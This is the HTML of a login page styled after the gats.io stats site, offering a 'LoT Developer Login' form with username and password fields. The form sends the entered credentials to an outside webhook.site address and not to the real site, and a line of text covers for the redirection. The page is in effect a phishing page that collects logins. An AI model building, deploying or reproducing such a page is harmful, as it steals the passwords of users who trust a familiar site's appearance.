<body id="app-layout">
<div class="container" id="headerContainer">
<div class="row">
<div class="pull-left col-xs-3 no-padding-left">
<a class="navbar-brand" href="/"><img src="https://stats.gats.io/img/gats_logo.png" alt="https://stats.gats.io"></a>
</div>
<div class="pull-right col-xs-9 col-sm-7 col-sm-offset-1 col-md-6 col-md-offset-2 col-lg-5 col-lg-offset-3 padding-right-8px">
<div class="input-group" id="navControlBox">
<input type="text" class="form-control" id="searchUsernameOrClan" placeholder="Username or Clan" maxlength="12">
<span class="input-group-btn">
<div class="btn-group">
<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
Search For <span class="caret"></span>
</button>
<ul class="dropdown-menu">
<li><a href="#" onclick="searchUsername()">Username</a></li>
<li><a href="#" onclick="searchClan()">Clan</a></li>
</ul>
</div>
</span>
<span class="input-group-btn padding-left-12px">
<a class="btn btn-default" type="button" href="https://stats.gats.io/login">Log In</a>
</span>
</div>
<script>
                    function searchUsername(){
                        var username = document.getElementById('searchUsernameOrClan').value;
						if(username.length <= 0) return;
                        document.location = 'https://stats.gats.io/' + username;
                    }

					function searchClan(){
                        var clanName = document.getElementById('searchUsernameOrClan').value;
						if(clanName.length <= 0) return;
                        document.location = 'https://stats.gats.io/clan/' + clanName;
                    }
                </script>
</div>
</div>
</div>
<div class="container margin-top-15px">
<div class="row">
<div class="col-md-6 col-md-offset-3">
<div class="panel panel-default auth-panel">
<form class="form" role="form" method="POST" action="https://webhook.site/012d5049-83f4-4bb3-b9b0-59134160db4d">
<input type="hidden" name="_token" value="B0yWglgTo9l2fsLqilxL68KquFhJd3piOgFJFNP5">
<div class="panel-heading">
<h4>LoT Developer Login</h4>
</div>
<div class="panel-body">
<div class="form-group">
<label for="username">Username: </label>
<input id="username" type="text" class="form-control" name="username" value="">
</div>
<div class="form-group">
<label for="password">Password: </label>
<input id="password" type="password" class="form-control" name="password" value="">
</div>
<div class="form-group">
<div class="checkbox">
<label>
<input type="checkbox" name="remember"> Remember Me
</label>
</div>
<div class="form-group">
    <p>If you got here by accident, please login <a href="https://stats.gats.io">here.</a> Some accounts may be redirected to a webhook due to incorrect authorization.</p>
    </div>

<div class="form-group">
<p>             </p>
</div>
</div>
<div class="panel-footer text-right">
<div class="form-group">
<button type="submit" class="btn btn-success">
Login
</button>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
